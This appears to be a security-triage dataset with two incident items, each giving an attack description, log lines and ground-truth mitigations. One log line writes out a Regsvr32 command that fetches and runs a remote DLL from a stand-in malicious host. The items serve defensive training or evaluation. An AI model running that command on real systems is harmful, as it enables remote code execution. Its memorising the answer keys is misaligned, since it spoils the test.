technique_id_20250405T162835.incident_description: An attacker exploited Regsvr32 to execute an unauthorized DLL on Workstation-12, resulting in potential compromise of sensitive data. The action was detected when abnormal behavior was identified in system operations following a rise in CPU usage.

attack_logs.details: Regsvr32.exe executed with arguments /s /n /u /i:http://malicious.example.com/payload.dll scrobj.dll
Outbound connection to malicious.example.com on port 80 established by process Regsvr32.exe
Unauthorized attempt to access and transfer sensitive data to external IP 192.168.1.10

ground_truth_mitigations: Block the IP address of malicious.example.com and 192.168.1.10 at the network firewall to prevent further communication.
Disable the ability of Regsvr32 to remotely execute scripts by setting system policies on Workstation-12 to restrict script execution.
Conduct a thorough scan on Workstation-12 for additional unwanted programs or scripts that might have been downloaded.
Restore any accessed or modified sensitive data on Server-1 from the last known clean backup to ensure data integrity.
Apply patches or updates to both Workstation-12 and Server-1 to mitigate vulnerabilities exploited by the attack.

technique_id_20250405T162840.incident_description: An attacker used masquerading to rename and disguise a malicious executable as a legitimate system process on Server-1, leading to unauthorized data access. Critical databases on Workstation-12 were accessed without the proper credentials.

attack_logs.details: Renamed malicious.exe to svchost.exe in C:\Windows\System32\.
Executed renamed svchost.exe masquerading as a legitimate process.
svchost.exe process accessed sensitive database files without proper authentication.

ground_truth_mitigations: Inspect Server-1 and delete the disguised svchost.exe file located in C:\Windows\System32\.
Establish file integrity monitoring on Server-1 to detect unauthorized changes or renaming of critical executables.
Review and update process execution policies on Server-1 to prevent unauthorized binary executions.
Revoke access to Workstation-12 databases for processes originating from Server-1 until further investigation.
Check Server-1's and Workstation-12's logs for unauthorized access patterns and improve authentication mechanisms.
